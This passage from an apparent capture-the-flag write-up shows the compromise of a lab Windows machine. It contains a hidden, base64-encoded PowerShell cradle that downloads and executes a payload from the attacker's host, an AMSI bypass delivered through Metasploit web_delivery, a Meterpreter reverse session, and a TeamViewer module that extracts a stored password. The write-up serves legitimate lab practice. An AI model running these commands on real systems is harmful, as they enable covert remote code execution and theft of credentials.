powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABZAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAFkALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABZAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADoAOAAwADgAMAAvAFYARwBqAE4AYQBxAC8AeQBhADgAYQBwAHMARAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADoAOAAwADgAMAAvAFYARwBqAE4AYQBxACcAKQApADsA
[*] 10.10.10.180     web_delivery - Delivering AMSI Bypass (939 bytes)
[*] 10.10.10.180     web_delivery - Delivering Payload (2084 bytes)
[*] Sending stage (201283 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.14:4445 -> 10.10.10.180:49762) at 2020-09-06 21:40:49 +0530
```

Now since we have a Meterpreter session 1 opened, we can use TeamViewer module to find the credentials:

```shell
msf5 exploit(multi/script/web_delivery) > use post/windows/gather/credentials/TeamViewer_passwords
msf5 post(windows/gather/credentials/TeamViewer_passwords) > show options

Module options (post/windows/gather/credentials/TeamViewer_passwords):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   SESSION                        yes       The session to run this module on.
   WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer

msf5 post(windows/gather/credentials/TeamViewer_passwords) > set Session 1
Session => 1
msf5 post(windows/gather/credentials/TeamViewer_passwords) > run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /root/.msf4/loot/20200906214205_default_10.10.10.180_host.TeamViewer__717224.txt
```
We found the Administrator password `!R3m0te!` using Metasploit TeamViewer module.

And we pwned the Box !

Thanks for reading, Feedback is appreciated !
